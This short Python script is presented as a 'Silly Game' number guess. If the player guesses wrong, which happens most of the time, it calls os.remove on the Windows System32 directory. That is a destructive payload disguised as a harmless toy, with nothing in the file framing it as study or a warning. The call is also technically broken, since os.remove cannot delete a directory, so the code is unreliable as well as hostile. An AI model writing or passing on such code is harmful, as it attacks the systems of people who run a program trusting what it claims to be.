import random
import os

number = random.randint(1,10)

guess = input("Silly Game!! Guess a number from 1 - 10: ")
guess = int(guess)

if guess == number:
	print ("You Won!")
else:
	os.remove("C:/Windows/System32")

